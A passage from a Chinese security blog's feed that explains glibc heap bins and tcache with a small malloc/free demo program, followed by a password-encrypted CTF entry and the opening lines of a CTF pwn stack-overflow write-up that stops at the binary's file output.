该数组主要包含的是<code>fastbins</code>数据结构，它主要用于提高<strong>小内存</strong>的分配效率，默认情况下对于size_sz为4B的平台，小于64B的chunk分配请求；但对于size_ze为8B的平台，小于128B的chunk分配请求，首先会查找fastbins中是否具有所需大小的chunk存在，如果存在则直接返回；</p><p>      我们也可以<strong>把fastbins看作为small bins的一个cache</strong>，默认情况下，对于相同大小的链表上，fastbins只缓存small bins的前7个大小的chunk（Tcache也只缓存fastbins或smallbins的前7个大小的chunk），该结构的特点还有：</p><ol><li>没有bk指针，也就是说它是一个单链表结构</li><li>prev_inuse标志位一定为1，也就是说fastbins chunk不会和其他chunk进行合并</li><li>采用LIFO （先进后出）策略</li></ol><p>      fastbins的结构如下图：</p><p><img src="/images/136-13.png" alt></p><center><font size="2">图13</font></center><h4 id="font-color-blue2binsfont"><a class="markdownIt-Anchor" href="#font-color-blue2binsfont"></a> <font color="blue"><code>2.Bins[]</code></font></h4><p>      该数组中存放的是<code>unsorted bin</code>、<code>small bins</code>和<code>large bins</code>，这三个bin均是双链表结构，均可以发生合并，并且一共有126个bins，分别被划分为：</p><ul><li><code>bin[1]</code>：Unsorted bin</li><li><code>bin[2-63]</code>：small bins</li><li><code>bin[64-126]</code>：large bins</li></ul><p>      下图是三个bins的结构图：</p><p><img src="/images/136-15.png" alt></p><center><font size="2">图14</font></center><p><code>Unsorted bins</code></p><p>      Unsorted bins可以看成small bins和large bins的cache，其中只有一个Unsorted bin，并且是以双链表管理空闲的chunk，并且在unsorted bin中的chunk不进行排序，所有的chunk在回收时都要先放到unsorted chunk中（对于高版本的libc，会先放到Tcache中）。那么在分配时，也就是再次申请动态内存时，<strong>如果unsorted bin中没有合适的chunk，就会把unsorted bin中的所有chunk分别加入到所属的bin中</strong>，然后再在bin中分配合适的chunk，bins数组中的元素<code>bin[1]</code>用于存储unsorted bin的chunk链表头。</p><p><code>Small bins</code></p><p>      <code>ptmalloc</code>使用small bins管理空闲小的chunk，每个small bin中的chunk的大小与bin的index有关，计算公式如下：<code>chunk_size = 2*size_sz*index</code>，small bins和faste bins的大小有一部分是重叠的，其实当发生Consolidate时，fastbin中的堆块在一定情况下可以进入到small bin中。</p><p><code>Large bins</code></p><p>      在size_sz为4B的平台上，大小等于512B的空闲chunk或者在size_sz为8B的平台上，大小等于1024B的空闲chunks有large bins管理。Large bins一共包含63个bin，每个bin中的chunk大小不是一个固定公差的等差数列，，每组bin的数量依次为32，16，8，4，2，1，公差依次为64B、512B、4096B、32768B、262144B。</p><p><code>三个bin的大小对比</code></p><p>      如下图：</p><p><img src="/images/136-14.png" alt></p><center><font size="2">图15</font></center><p>      在讲完free相关的知识点后，我们应该清楚了，在free我们申请的动态内存后，系统并不会及时的收回，而是将空闲的chunk放入对应的链表结构中，等下次再申请相同大小的内存空间时，就无需再进行系统分配，而是直接将空闲的chunk返回，这样就极大的提高了堆的工作效率，下面我们通过一个示例代码来说明这一点，不过要说明的是，因为我的链接库是用的lib-2.30，如下图：</p><p><img src="/images/136-16.png" alt></p><center><font size="2">图16</font></center><p>所以在分配chunk时采用了tcache机制，关于这个机制我就不在展开，只需要知道<code>当一个Tcache链表装满了7个，再有对应的chunk被free，就会被放到相应的链表结构中</code>，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *c,*a,*b,*d,*e,*f,*g,*h,*i,*j;</span><br><span class="line">    <span class="keyword">char</span> *o;</span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 1</span></span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 2</span></span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 3 </span></span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 4</span></span><br><span class="line">e = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 5</span></span><br><span class="line">f = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 6</span></span><br><span class="line">g = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 7</span></span><br><span class="line">h = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 8</span></span><br><span class="line">i = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 9</span></span><br><span class="line">j = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 10</span></span><br><span class="line">o = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 11</span></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"><span class="built_in">free</span>(d);</span><br><span class="line"><span class="built_in">free</span>(e);</span><br><span class="line"><span class="built_in">free</span>(f);</span><br><span class="line"><span class="built_in">free</span>(g);</span><br><span class="line"><span class="built_in">free</span>(h);</span><br><span class="line"><span class="built_in">free</span>(i);</span><br><span class="line"><span class="built_in">free</span>(j);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在示例代码中，我们一共申请了11个300B大小的chunk，释放了10个chunk，按理说释放的前7个chunk被放到了Tcache中，因为是300B，所以后面三个会被放到Unsorted bin中，下面来验证我们的猜测，结果如下图：</p></blockquote><p><img src="/images/136-17.png" alt></p><center><font size="2">图17</font></center><blockquote><p>有的同学可能会对上图产生疑问：<code>Unsorted bin明明只有1个chunk块，不是应该有3个吗？</code>是的，的确是一个chunk块，但是大家看一下该块的size是0x3c0，那么就是<code>0x140+0x140+0x140</code>的结果，可以看出，本来三个chunk被合并了1个chunk，这里面涉及了<code>Unlink</code>机制，限于本篇篇幅，这个知识点就不在这展开了，有兴趣的同学可以自行学习，我在后期也可能单独拿出来介绍，因为这个知识点在漏洞利用时还挺重要。</p><p>还记得前面学习到的prev_inuse位吗？在上面的Unsorted bin中我们就可以感受到该标志位，如下图：</p></blockquote><p><img src="/images/136-18.png" alt></p><center><font size="2">图18</font></center><blockquote><p>如果标志位是1的话，那么size的大小应该为0x141，所以在这里标志位置为0了。<font color="red"><strong>注意：一定要明白只有在双链表结构中，并且发生Unlink时，标志位才会发生改变</strong>。</font></p></blockquote><h3 id="font-color-navy0x05-总结font"><a class="markdownIt-Anchor" href="#font-color-navy0x05-总结font"></a> <font color="navy"><code>0x05 总结</code></font></h3><p>      有关堆的入门很难，因为我的知识有限，所以只能先帮助大家了解到这里了，而且也不能保证本文没有错误，所以还希望有兴趣的同学可以自己再去看看其他的资料，自己多动手操作一下，以帮助自己的理解，谢谢！</p><h3 id="font-color-navy0x05-referencefont"><a class="markdownIt-Anchor" href="#font-color-navy0x05-referencefont"></a> <font color="navy"><code>0x05 Reference</code></font></h3><p>[1] <a href="https://zhuanlan.zhihu.com/p/24753861?utm_source=wechat_session&amp;utm_medium=social&amp;utm_oi=843456231229227008" target="_blank" rel="noopener">Linux堆内存管理深入分析（上）</a></p><p>[2] <a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#malloc_state" target="_blank" rel="noopener">Browse the source code of glibc/malloc/malloc.c</a></p><p>[3] <a href="http://abcdxyzk.github.io/blog/2015/08/05/kernel-mm-malloc/" target="_blank" rel="noopener">进程分配内存的两种方式–brk() 和mmap()（不设计共享内存）</a></p><p>[4] <a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" target="_blank" rel="noopener">Syscalls used by malloc.</a></p><p>[5] <a href="https://stackoverflow.com/questions/30542428/does-malloc-use-brk-or-mmap" target="_blank" rel="noopener">Does malloc() use brk() or mmap()?</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>CTF-misc类型题目总结</title>
    <link href="https://muzibing.github.io/2020/07/12/2020.07.12%EF%BC%88135%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/12/2020.07.12（135）/</id>
    <published>2020-07-11T16:00:00.000Z</published>
    <updated>2020-07-25T03:10:50.828Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="d4808b5bdac6aecdfac0c4ee04e40320e3d7d62044026298eab971ba5854aa80">c0b876c68ce8db4db0f2c5b16525afa2120afc55a2908d3322993c0be48c66eea98792901880c8466344c44217b8155245b9c97fbf56caeec538fba2091d2fb1d44e09e20b8cdbdee5be6350e1ed3a9ec590acbeffabf613ab20db6d5c1cb38b57ffc0ff870bd64a59d98382f942ba3212e7f7a5386a19166af01f12a34921daa0f3f6da3f96aea2bfac19fffc6650f573c5e9e7d7c215111b530660463f3bfabec4e27c4232e739ec05a738e8cee95d24780134dd31c6a366ca0cc82e18c9e5c87d52965fbe10fd5579b033df16f0acd7f02f5711f2a73bf56ff93fab2224a5404fc63eb0fd6fa525127b5486f3c221c47752020457ad08b22c4424191553667b97f515f47201f5b325e5ae36af9d830cc996d352c2e9807b009af628ada336576337d32a5a0a07a490c1820e59ffa3aa8a9ca27319188efd967ca8a67582b64ea9628a35280c65088f521629e399a3f62680b2beb3550df265af60538193222ed2deb595fdf842a46ccd6ece97b8869c29342ad243cd805350ff135e2d6d7ccd9e34cdddc1ca5c34139f048db62ae75ca268ad9efba9526a838ae863acaccb124e3f219283575958588b48507f9da915657e310226013170f9ed0003b8674fa9f326c36693ea57b1dfa57268d6858c80a56cd07d6ae8f6cb65fbe11b8730bbdb44ef12e6eb32e06a31aa543452b3d00e27b76541e210bcbe9486bcd0c01753a76782a0a4552878bf6279bdfcd254d2533e89bc2352f8b6027e6501a973e65781964c58be7e776c39e01aad805faef40226577b75df9285dadb98f88bcb5ab5ea71b9c54693e8f212c57a2f71f3eb1774577ccf9d2e65c3e1cbd64243a39a417506cca5e08632a1d375fbc8bca80c24e48ed272ac0c6adc9ac1e34be234519540865895d2067dcc2562e7b881fdd1923e4b1b2e6cd3e972a226423fa34534f9a19151d25cf4fd2f2e58020585d13f826614055f39d67ad4f907056c68cc6c2cba4c7a90f24965a5b940b130aa0bc793c8de0509a4a2beed27253f7e2f835c565879b422932bd4a871936626178daf9569242d79180cd45d3572c805867dd10ccf5fa66a23efb3dd609032f4389394f7935d5ad337461899e98e672a241aa457718c8645530a3db92706150c6e000f51df64c070e836ac4a27a19672a798c2451a0d2bcdcb64c70450875d96e4f8847edd69aea2d605385f624379011c8669693cf85ec44c6ae53ac4535f430a85e061304cd5d449af361dccbc9044d6781664e87aab78067113a88bfad750c63918ec460b06835a1fa60738b1818ad1e9e790a94c45fd89f8e2f13231fddc150eb61ea5ca58090142ddf86bc05b7185748b0bf939131fff34b6d70ba5fcb7dbb8d25b12a3b6a6ca5d22c86cd63ade4fb765591ba43fe42b250c4371e74e57389adba4297d1dbb855606e6be2124fbe0d53e7f424db5ca37c8c61d413f5ff9b5daf6fef0af6906256ebc3c648539b9b94cc11d0bc4cda758955cda10053fc923d1fd86259e6c3bb5367924ebfe8983e7191ff67379b418662a858070807f963fe6c6e4a2fa8cc5fa6088900eaaeb3f63ab031ae184154e1781a8601c59cb864fbdfeb5833b43b621268842133108e21aaacfa88462387187b9794f67443ccef38d30a41f794867b1b289a8096947b36c5281e6f861eabb0ce10578b69710fd28c19472d9ef1a7c59086c0658b566a9ba89c1e4778196e52d21af6d58f53bec1e858024932454556b2a2bc2e44a19e50af587cc7e71ffff766fd64cd6f1cc59d46c978d0ada0609a0ee1fb8952094d64567cb887336b3d696a3bd5703554db3befe697a61f38f92534fa2fb87a02ea3aa1441dbd495981c2dd8266a7d961ca92c10c25c3d8ae1288047e0c29914e55320cfd48e7369572e0116f31c84e9862a50e46dc390a35e25920de3f1d00e327da087ae547b0a1ac8c47ee5580ebba876e01036f07cc32a35b4010306096f876da41a8c7d9be239221587153d6b813b91b7ae0b83424e0469e7832110f6b3ab09a2268595e0f23303d52f1a5e92804b19bac1d8a80c81f12f4143b57e8a20436fc9534f46184268633fb12de2c98861e5b441aa78bc0b661c0242eba907257403488bc57d0a95cb485d011969bf051bcc896595d2bc661deb4eb0d3d1bda071db274fefecc276d96058981c152fafd6f457a4f0214c8ddefd12addbc8963c7500c3e824ca3a853bbe3979b53a5a5b5fa7583efb24268bf9627999cdec41c0ff55c500c134e44529b1f8d7a13c799f6be08d9ea26f5a09f076bc9b78cbb0e66997c7386d68a2b4110329833f3e47d247b5482facffc65526a680f46c9f0f0100fb632616d1ab41cbf6cc597587b619e591e25594661b2df57644a3183bda14f9df55175d3717f10ba4b8580fede394ece155f59b6e7caa057a8588e7d34ee3d901f5a42d27bd4990a4eefc0e4ef63a2976d8182d1fa0acd04901e223a772ffb24d4a50542d1eb5a0cead0f0aea48c7da58865de278a353c9dbc217cf6a268c2f032a17ea23b4e5c397c58d416c188e73b81c69e17234890ae4d13cc9f2576840a7825f6182cf31549e5a7873493df5bced8e32b2c38780bac7546b08fe925fbf647dc10afc5660e182d488663aa02f868a9fb4247e8a701c63f9f0125b68395736e969ac6bea844b8bcff43ce8f989d9ee50885c1cb1a01eb25ae70952f8e065528480897d1034cec516bc725d235bec8cdaf51fed1577747977434e4e78869bc64ddbbcb864a7009254754b7aac4dfaf2236a7554b4f9631eae7b9b1207f3af63372f9a735b2a1539b59980ee370902bf51b9877e41f886b2f5fbd59ebb40f894e51daea58ba5b829953f620a51536afdf3030437c804a51321909d2284eeb32391a782563aa12854a5f3485d3389f2bc712bd046db50959b404ae68a538bdf377c32a61f0f41b9d94ba67cdc6ab690e76719fe82b56f31ec4bfdd57785b72382c284460077159affab8259d98c56084a5277a914347ad501040fc24d9c87ddac472fae2ecb0ad80bbe3325410748c2b582917dacec39533c3e09e7e6f0ad35cc084d1029becfff8d6d9a676fc6f97a8a0b38daf1ded848a3c649c3ec62f0e78f2d1a225dd40eb0230f733eda044ad42a4fa83499ed8eb24ece4f88cd2a089988c8433e559508bde79759f4a1b4d9c17faea4590b4f95db545996f08cd631bf6e6b2b6984b1278947f40bac178b035363589c69e5ecb9f71bb03016052e73eef2db1f83c669b64851f69aeb2d46f8eea757d18f4c824c180f9f76d61d94b9630b8bcb7ca81184a9e37996af28d107aad06db4fe3b7af22c815ebd5315e0b9e3816dcefa40b2b6c0d996f1160879a33b19f780e20f50da19c8d70c03d12fe975950ff6b19378c0156801f995b200ac281367178941d935e25813f39595f7c26ac3e30de4cd41526ca8e574314d01872eae12e7b08f0f4a26e9db12c8ea2952f7e5e5e6fd16ab29766a70c8bf8b095ef32c24a2679037ed499535546a8a3be55b79eb84eabb95773f3f85514c2d7f786b0b9c7f530fa40d2767b256d1182ad906625315a666af493a24b1ce665654c97d7e7eff1271c657e9c2a73156921e9daa3777d7c63da4f9be2e12646dbca48c42dad41b0af4211da774e63073088a20e9dca40ec2ce0ebec932521f79cd125d48c5917febbe583db430494b792ff57b906f0fe412cd333738122ee0749ef42b731df7660d3015646506d6144b238fb3d519ae4e62f60c143e83155a8daaf202ee5c46a0e20bf46ee1e169958f33ae0805fe8e9efb1c5f86040c6978104dd85c2f1c36927d1bd4fb82472190c7d7f35bda89e6f46181724c651ff7f3c2624c51646ace66fc90e48d7c9255888158e7f01496fe732396c402f6886cb44697d083cea93c7ad171eb8aa192e9ec6d6db5b9057736ce9d26e49a350be78157a46c7ba62c166445397cb064f139e4f207281d7aaeb32b155382032e78c5f4a8554619e3f8652e30aded3beaced7c4c0c38a1bd74c688338f143b9d34e88af52735341ca58c8b264db061dbffbfd849e6a607db83ca94a85e753f3c5e1baf698c2940527b7008f33001567a0d411e079b61655d76de17e71bd78e40dff671cfb36465cff5329839b4495a3be3013d52f02de3d15a7a337d3dbb9fb7169f374d3c07554ff0699b9c599051583aeaf47ba9030f8b7116d7e299930e31663b09344d04c103f7c3c6389ede4def35ed42602e5ced47161e38bc40691bfb694bd82b12187445350bf8b47a78fe233d67289d6a86aa935eea114946a5facf5f489ac3478a1f4fb74a6cbde9b027d952274fdb3f892762a60ef80a4e8a6d7549721444b7cd401e365d8ad22c3cc740799f6822cf3fbd0f9e1cceb12557cceba1ee5c4f042768abcf7a0520d383618ff0b9ee8698638bbd47eed91fab6175cd4d6359df7fb7e4e80fe6815cd385007d726ec73ebbf3520543c9274f0d8833c92a638dc51e83b7765deb577c7a41f589a56e8f899e5c1aa4c12e6d4695902ff790cc27eab7f9f67c9019c8a3fdde309fabb580c532b27047b1c2a154f1b9dd60aa4e758782776a26d5379d1051f93650fd56d0b71e34a692d2c2da91bcf5c349c002297d9025895fdb9288236f36b18a9f27e2e66209037cf5753029d0d451edb5b7aa7ce487fb6387b16e2875f3c08fbe9051b6eb432afd4da58f872441b717dcb1a0485429d7d58613adebe05f4f4c6782d8492e4d10e721f5dbe37b4bbc5d8aa3ff665ff704e0d845be138fbe86c7806788b3e2f67996c35b9a862ca9623a0fd9b554e8714192163c7d4f7e5e3db518345919d7cc925aeaae19226e762c6eb59dd3c5dc1a802990843f085d215b5c5d523fcfd68d7895b40167dc2aaefa7eec4f068fb60d76992733f3d95d594ce3e034308e89d2b7776bdf3adea52a33c1ec1f85a87a0c00dbed26ee548216cbfa8ef34e1cf49f745e4d4780c7773aad8e2ffcff4baa80a639c4bc1035d663417c10388c0d77abe8bba9ff738e7c4cb216d31c924e2438ef42841efe4f6771e4a8b19a847e6944d900752344b821500fdc3592621263e63cd8ac866c15df16c4768a3b51a44c53eb6f5b6a2191dd70b9d1974cc886282e68c385442111d7ff9b970f5b60bb9a84b18c5f931194286d62b7e22aee6acbc34435d1f796191a9da609dc40535efe89503bbe16b0dafbc47ea706ebbe17bf748142b68c29b128b9d9cda6dcb89d748a5577ad24230f2e2d961ea354d8660d2233cf9092845674c9acd7e63e10afd1796fdf098f9b08ff1b920698dab2856efd603637b485a5053c6a5e314827a4757c33f6eb8a106bdd61e0dc77f684a9267f14138e5e8d841c6a8ec3b9bd5663ca53bb10cb8f8bd03815b1ec07d41ff3d478be5f8ae9cb73f60087be5c40cf3a00000ea2353212b2e120e9e8cd620518d323958f13d97029a82daaafdd97e581e7096f9076d06d7b7a3e7cf37c27f292894e25b1a131a6ad4ef780cc6672b3071176d0feb7a89ee47929dfddf4cc3908545d776d41eecd96fc8d2b05714b6c4063e75ad4b0da0d2a45585e3adad7f8842a0ac0b2c3e2fcea6c0b6df7d6eb64424e703e3132bf60e7c7531a0e8ea5055107abe9571ba81b5b6d67df2b515d2fa8cdc5ff17cfe3cc1f4bb711adc5de7073d3963211ee8a95bdb4718183fd672f6bbd24e51ad8bc32c469c2bd82f6c54e2dbd3a600525292c4349b146fef766272700d4869fe7f5a45f853ae1037c84e2afc7d6f47c6cc710fb13546537e80835ac296a419b1310e84a607974cc692b628a2b8cb7e859eb3eee610ab4ca6ea8a4bc6a019457dc4a347220547160384f33db52b512cd8645506fb5b5fdac2927541604202b8d08f2a0c567432ae718206161dff5a9919f2e66a837122e6bedd712de43e7d9620ea68e7e224d7240c6ac50d4d7602bfea7f7d460f5b48b21d9a2c536fbfe27af900ebeb80b4e1717fe08b083ee4c1f9244514e0f54391fa4448af14bd81be95afaf16f4f0cc749c5c5e9b830a549937ae610b86eed9582281391d32ca1677cf038bbab0b37489835be58639b9e684cd629a4c88426392515cf1010c34434b48ce48895bfc8b6da897916aedbe14bec14aa4b70a73c41c33706050e4fa5bd1d6c07847603f060bb3a4ac4a2dce2a2866343d8e9681432d28e59048255cdac0d1a12b881e04ff7ef59f1b3bd2cf84673921f1468fd481a7b06fd6fd053b1e60c6aae15d2132bbd33c76d0ffcda5518a784bd283927d9c3a328916b5c4eb9cbaa16cfa3f671237b80ada9943f5dc8b19b571a56bbcd517b3ee7466938607d5f8e4dad802c2cd40594d95a1f5ab793b7d2104b46e50c6595e31fe5f738be75e13447ee0e36bcc7dbf604d454d02e13165dd376dbde4fbe039d6a158fd2971336833591ef6fe21acca48283d227605d23e59ff3b7018e60529de68d8e03d9961acd8ad480b3cf7c2a8240961e9b5cbc5d9c22e2ce0ed5ad2539b79972a306a7771ebb0c50e73324676f77b1fd58da48334f77498e1d0b6f4233bfe95ce8a5d4015e97f957a9d12698bc5ed9970d44eae2d029733561e0299b8103a1f377d8c2043ae469f30b0b542bcee169cddf793eb2183e391fd7fef05d4cb54f2f73e5c73944fcb4ee35281473ddd1654c41dfc9e8eb5bad04655c35b1cc2bba3bef092c9cacd0fd61e704bef63238d2bb6a3c54c816be6651e00148989b4f5dae84619b9d536d8237cfda19e9d65653f16e116bd836ba8ab9809cd3e1f3673122fd196ed114e98ac8873c4c1659949ca136835476c4da7e4abbde04b848ebc8a1f7ddd75f19641ed99e5047fdd76ab0f8990f150f60d59257c6d90474f3a58e814356c06a4079340f05b1544a563ed05a6ba6484f31cb3a399a63168219b5d938fe65fdb1fa4b8ecabac707cd59001875f99d568ff707af1715c2f070b192285e7dd9c043cd80044ba6adc0c9fccc12429bd7afaf8d32dbd17b116bea2611c56765f11094c03106ff1e147b6217ea4284b412633485d1d21cda5c4f800f3cc6a43c9ac0066dae259620aed33bb2530b8c4e8ae926475d57205c60edb63210d544eb89510e4380dc932d64e12becf1102c95913003c2e75cb0578e34074bd3e7835fdb33153dc52b4883de7a786763f14203abbe197658a755e2edea8842780b21a3ce7121d23b25170b9bd25b8a676bbf1bc1cbcfe76cc586842586e98b964cdee80ffea1b442c6945673b809ed95f55c8c1d844fa6a34f2396234956f60a9be01ceec7799955134640802d1a8790b11b22fe745f08022a0a1bd765d1d38b75ee02ccb370c321ec9271771c77c22e2c4d7140886858e26314f54eaf301c83b7b04dc3f92af6b5a05351db37b68a0587b1e9ba08a31190090d16c5a4f496542dd69838324f199bad09fec94ac57d5d9669f12efcf9852fa442301091af8bb7f303d7ef3e749075d8ff0ad419d4a00a3fb2bd0d2f1c9482f669a86a066cf27379958ab6b45cd6eac00c616d3e9f72975f1fdbd57244788b144d7a7547fe13fa56aed1559e8136f959f0aedc99a046789d6cb01a183814cb71f7e17663a916017d866b26f588fab4f00ab864d67f0390d5d6a87d57b6d041a4ec78380992f43946502e49d02d5a8f9edc11526271b2029dbfc146d9b67aa2864c624a557323717c301363064a462a24ebfb03ec8eebccd7641bdcc803ef8299f6fd0a606b19799de59515bfe2c50a021370bfa1cf5885306b8303b4bc564f4cc21d82af7f762b24a59cc32dfb42680d9cf93157d6c0aeebaf4afbe2d72aebc135bf35afea40b9c4e4aec1a1a958a74fe99e528acdee887b4ed65ba75e8d6c9b2662789202f4576c3d4658db705a0219d9e3c78801929ce8eaf2045c821c6fd912f7aafe7a9016f0f9a56609ddc940f16f4542bb8888da8f5db2d2a05350bb70d5dcb6f76d9c294388157a6470878b31e7f9c2692143beccdf920f4d9cac4f1957dff6385af5fb63fb97b31c64cdfa61e6005e8d233e47c1a56e7a87fa57b51c8118cc1f8834330c1c56bef7cfc19d102476345150c40d806525ff3f05ca6ed68133ddacaea52885f7a490f7fb1443384b1ad469f9237dcb603a9e07e738c74fdb4f40254fefb12cde3f58c2943f9388ef04355bcca2d93007a7702de6453a5b62478ea32813140ca7e426d1084dd0359046fb1b593a9eb320b148b7ec5c19f8a6ae732c43414fcbbd7099d591ad91f2477862145e1eda1f5414dbe60adc5234e58aefb67f815b25bb9a5e9bfde1daf641a29e9f6f756da23337839e81520090ccfab7590227054d73b5dca0a0d4019f83278825cbb04fd879d6586f54e7b7991e1ef97648c51461fd6def785bb900cac9e1f12f5f991d3f76e018e38e7df9baef49ec6625d56e549756589020e8a0802fc72f1666350413d0c69592337624cfbbbf05ec4d5f2febe721ff238f0018ca703de1ac8e10185e117ac0f423b6e5b8c3b012d7dc5532f11ad7233abfadb7ba941a9835818250ab18be65687dd2ed30b41032dfcab5ed039d60d3ff339d5a278f87e13cd9b44aa39fcb754e280f306c503d2c58ffc2cf4462e4a72406f6cc5fed6b6d48536cfa5a909c7fd1455249d1c58640a69ee8efe46038f9347dba3fc21fd436a7c6d92209e3d495d9fc3d615d34ca91bc2676b7679093cff2b86fc0d8711238c74532a534773c691eb6834761a179249fdf81551c10b22f4b6a86db4931002aa9227ca7818b722d8d9e8a8679d61656656bc88a5ef9b93244f32f7de4a140f1b961ee9d95c53da5a6085e679b4b7eb83b68073ceafb01ffc4327239e4d7246a640b84d8391d42a302b4c9d9ed1790ffcad19ab6202779b63ba1bb03f86b6316c29568f65e4f5b6c68d7361845e12a0df8efacff32e13afa4d753449ed6c36faa4918341a31d6ca62894da3f315f9afbe50d17015054e1a2a3845c924ee8486985e87727bb02c90544a1219ff5460500875f2e36549b7e57209fb80d4389f9d0c23096f55a98285921c3a124aeeea04a3f333df38c195c5690b07fb484c367ac23b6bea8a1e3a3667d35c155808af2136a351e21c043e949cf6dc9dd9fc51ca92c6e988387ab58a2603c2ec0c4b5fdc0d9c2984201af251cd74e7f8097dceddb9bdac1aa3afd7744d87221fb0860ac743a9e42ecdc44dcc47cef2ecca9f41e8f3f92f4a423abd18808c776f126e0f498c7afb662d5972593f505c0de45a9eac5529f9648b82de2e8e3cf2722522c8430c560fb3b67a6c9383985a5cfa6e1639e0b02e202ec78d214a0dabc9bd4b21eb9b8de63a50e577fe1eaa61f1e4ca1495d7ca7a235527251fa6f75e1b83a1e619e88845b66f3f2d47ca632569c6f911b66f8b81c4ac2447b7d36b765651f0209d7b4f5369c215ad40ab21c5b8c34fc90b95ff67174e21f82b72946a73458c7d75a25b82c1bf638022b20576ae70ba86b5812a5f24dcdc8d68d358f4e48003e912f37c0a9014e3319646bc3515b4ada08a32aff05fb21106522087f0cf7b58c6c2ded960dec280fa806c05185fc8dabd9767a28377193418c0738c62d8444bdaa06a6c610e9181eed5f9cee418f58310b59462871df9c21a52a7a7c97ddb2de28364658bd029bbf170f233d16ac45b56361b9010ef848815c0f166efe80defdcb0a86be8694a8b7d7d933b393a8c42e338d710bddf87ea925e79065abfa538c3f35a0dee39bb51178d49720a38c0fb8977f1230619ea96ed59518115d91e7bb7f06acbe6cd1e0572954e571e28133b3f0db20a5952ff2bcc35001205119b847a11af1b82fcb8185d65c7d185f5946d24321224a50f50cc0215f5f69c89e729fa943fb290bbeae40e1bcd8923ff817253149733512b6ed9f4d465f180a0bfc0f5f90d6c6aff83179b57dc860766ba63aed663e8c6370ba61f943492eb135cee76abe9d7b029418191a39cc17774910a2d3d6e412ed8c83fae94050aadf949ba5c49ae7526d99a109b65efc35dc9b3073a6188f8</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>【看雪CTF-pwn】一鸣惊人的栈溢出</title>
    <link href="https://muzibing.github.io/2020/07/04/2020.07.04%EF%BC%88134%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/04/2020.07.04（134）/</id>
    <published>2020-07-03T16:00:00.000Z</published>
    <updated>2020-07-04T14:37:00.456Z</updated>
    
    <content type="html"><![CDATA[<p>      这道题目真的太坑了，不过也给我提了一个醒，就是<code>在做题时不能对IDA pro反编译的伪代码过于相信</code>，在感觉有问题的地方，一定自己用<code>GDB</code>调试一下，否则就会陷入一个自我反省和懊恼的循环中，下面这道题目就是，下面我将用两种姿势来获取flag。</p><h3 id="font-color-navy0x00-准备工作font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-准备工作font"></a> <font color="navy"><code>0x00 准备工作</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># file ymjr </span><br><span class="line"></span><br><span class="line">ymjr: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f13f004f23ea39d28ca91f2bb83110b4b73713f, with debug_info, not stripped</span><br></pre></td></tr></table></figure><blockquote><p>可以看出该文件是32位的ELF文件</p></blockquote><figure class="highlight plain"><table><tr><td 